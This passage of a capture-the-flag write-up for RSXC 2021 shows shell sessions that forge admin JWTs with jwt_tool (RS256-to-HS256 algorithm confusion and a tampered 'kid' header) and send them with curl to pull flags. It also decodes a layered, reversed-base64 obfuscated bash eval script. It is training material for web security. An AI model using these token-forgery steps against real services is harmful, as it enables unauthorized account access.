juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s <span class="token string">'http://rsxc.no:20014/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>You_have_to_remember_to_limit_what_algorithms_are_allowed<span class="token punctuation">&#125;</span></code>`,jr,kn,fm,nl,hm,Pr,fn,ao,dm,Hr,hn,no,mm,Ar,eo,to,bm,is,gm,Xr,dn,oo,vm,Gr,f,_m,el,wm,Em,tl,Tm,ym,ol,Vm,xm,pl,Um,Rm,ll,Nm,Wm,rs,Sm,Mm,cl,Im,Om,il,Fm,zm,rl,Cm,Dm,qr,mn,Q6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8 -I -hc kid -hv <span class="token string">"portal.php"</span> -S hs256 -p <span class="token string">""</span> -pc username -pv admin -pk <span class="token punctuation">..</span>/jwtRS256.key.pub

        <span class="token punctuation"></span>   <span class="token punctuation"></span>        <span class="token punctuation"></span>         <span class="token punctuation"></span>          <span class="token punctuation"></span>                    <span class="token punctuation"></span>
   <span class="token punctuation"></span>__   <span class="token operator">|</span>   <span class="token operator">|</span>  <span class="token punctuation"></span>     <span class="token operator">|</span><span class="token punctuation"></span>__    __<span class="token operator">|</span> <span class="token punctuation"></span>__    __<span class="token operator">|</span>                    <span class="token operator">|</span>
         <span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>       <span class="token punctuation"></span>         <span class="token punctuation"></span>     <span class="token operator">|</span>
         <span class="token operator">|</span>        <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>    __  <span class="token punctuation"></span>     __  <span class="token punctuation"></span>    <span class="token operator">|</span>
  <span class="token punctuation"></span>      <span class="token operator">|</span>      _     <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
   <span class="token operator">|</span>     <span class="token operator">|</span>     / <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
<span class="token punctuation"></span>        <span class="token operator">|</span>    /   <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span>   <span class="token operator">|</span>
 <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__/     <span class="token punctuation"></span>__<span class="token operator">|</span>   <span class="token punctuation"></span>__<span class="token operator">|</span>      <span class="token punctuation"></span>__<span class="token operator">|</span> <span class="token punctuation"></span>______/  <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__<span class="token operator">|</span>
 Version <span class="token number">2.2</span>.4                <span class="token punctuation"></span>______<span class="token operator">|</span>             @ticarpi

Original JWT:

jwttool_b369f60acd84aec98b34740db6882c06 - Tampered token - HMAC Signing:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ</code>`,Br,bn,L6=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP15</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20015/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ <span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>Don't_let_others_decide_where_your_keys_are_located<span class="token punctuation">&#125;</span></code>`,$r,gn,Ym,ul,Zm,Qr,vn,po,Jm,Lr,_n,lo,jm,Kr,co,io,Pm,us,Hm,su,wn,ro,Am,au,Rs,Xm,kl,Gm,qm,nu,En,K6=`<code class="language-bash"><span class="token comment"># 16-challenge.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" '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
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")</span>
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code>`,eu,Tn,sT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'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 '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d</code>`,tu,Ns,Bm,fl,$m,Qm,ou,yn,aT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'=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'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span> base64 -d
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
